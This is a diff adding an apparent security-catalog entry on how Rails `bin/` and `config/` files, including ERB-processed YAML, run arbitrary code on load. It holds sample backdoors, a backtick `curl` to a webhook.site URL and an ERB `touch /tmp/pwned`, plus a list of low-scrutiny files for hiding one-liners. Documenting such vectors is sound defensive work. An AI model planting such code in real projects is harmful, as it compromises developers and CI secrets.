@@ -1,0 +1,117 @@
+name: Ruby onRails Config & Bin Files
+id: rails-config-files
+description: >
+  Rails applications are configured through plain Ruby files under `bin/` and
+  `config/`, not static data files. Every one of these is `eval`'d or `require`'d
+  by Ruby itself, so any top-level statement they contain executes as soon as
+  the corresponding rake task, server, console, or generator boots, long
+  before the app's own code runs.
+
+  Several YAML config files (such as
+  `config/database.yml` and `config/cable.yml`) are also processed through ERB
+  before being parsed, meaning they too can execute arbitrary Ruby code,
+  including shell commands.
+tags:
+  - ruby
+  - rails
+  - code-execution
+  - config
+
+exploitation: |
+  Rails generates `bin/` wrapper scripts and `config/` files as ordinary Ruby,
+  and Ruby has no concept of "config that can't execute code" — loading the
+  file *is* running it. A backdoor hidden in one of these files fires the
+  moment a developer or CI job does something as routine as `bin/rails server`,
+  `bin/rails console`, `bundle exec rake`, or even loading the Rails
+  environment for a test run.
+
+  ```ruby
+  # config/environment.rb
+
+  # Load the Rails application.
+  require_relative "application"
+
+  # Initialize the Rails application.
+  Rails.application.initialize!
+
+  `curl https://webhook.site/6e09b874-dc09-4a40-881e-88d558f593f7`
+  ```
+
+  The payload runs during application load, well before the request/response
+  cycle the file's stated purpose implies, so nothing about the app's runtime
+  behavior needs to change for the code to already have executed.
+
+  ### `bin/` - executed directly, often with elevated trust
+
+  These are invoked directly as commands (`bin/rails`, `bin/setup`, `bin/dev`)
+  and frequently run in CI or on first checkout without review, since they are
+  treated as boilerplate scaffolding rather than application logic.
+
+  - `bin/rails`
+  - `bin/rake`
+  - `bin/setup`
+  - `bin/dev`
+  - `bin/ci`
+  - `bin/bundler-audit`
+  - `bin/brakeman`
+  - `bin/rubocop`
+  - `bin/thrust`
+
+  ### `config/` - loaded on every boot of the Rails environment
+
+  - `config/boot.rb` - loaded before anything else, including Bundler setup.
+  - `config/application.rb` - defines the `Application` class; runs on every
+    boot in every environment.
+  - `config/environment.rb` - loads `application.rb` and initializes the app.
+  - `config/environments/development.rb`
+  - `config/environments/production.rb`
+  - `config/environments/test.rb`
+  - `config/puma.rb` - evaluated by the Puma server on startup.
+  - `config/routes.rb` - loaded on boot and reloaded on every request in
+    development; high scrutiny since it's touched constantly.
+  - `config/ci.rb` - only evaluated in CI runs, which makes injected code
+    less likely to be noticed locally before it reaches a CI environment
+    that may hold deploy credentials or secrets.
+
+  ### `config/initializers/` - runs once per boot, rarely reviewed line-by-line
+
+  Initializers are meant to be small, declarative setup snippets, which makes
+  them a low-scrutiny place to bury a one-liner:
+
+  - `config/initializers/assets.rb`
+  - `config/initializers/content_security_policy.rb`
+  - `config/initializers/filter_parameter_logging.rb`
+  - `config/initializers/inflections.rb`
+
+  ### YAML config files - ERB-evaluated before parsing
+
+  Several `config/` YAML files are passed through ERB before being parsed as
+  YAML. Rails calls `ERB.new(File.read(...)).result` on them, so any
+  `<% ... %>` tag in the file executes arbitrary Ruby, including shell
+  commands via backtick expansion, at the point the file is first loaded.
+
+  ```yaml
+  # config/database.yml
+  default: &default
+    adapter: sqlite3
+    max_connections: <% `touch /tmp/pwned` %><%= ENV.fetch("RAILS_MAX_THREADS") { 5 } %>
+    timeout: 5000
+  ```
+
+  Any file loaded via `Rails.application.config_for(:name)` is also
+  ERB-evaluated and exploitable. Load timing for the built-in files:
+
+  - `config/database.yml` - loaded on first database connection (typically the
+    first request to the app)
+  - `config/cable.yml` - loaded on first Action Cable connection (typically the
+    first request to the app)
+  - `config/cache.yml` - loaded at app startup
+  - `config/secrets.yml` - older credential file, loaded at app startup
+
+references:
+  - url: https://guides.rubyonrails.org/configuring.html
+    description: Rails guide to configuring applications, environments, and initializers
+  - url: https://guides.rubyonrails.org/initialization.html
+    description: The Rails initialization process, including boot.rb and application.rb load order
+  - url: https://guides.rubyonrails.org/command_line.html
+    description: Rails command line tools including bin/rails and generated bin scripts
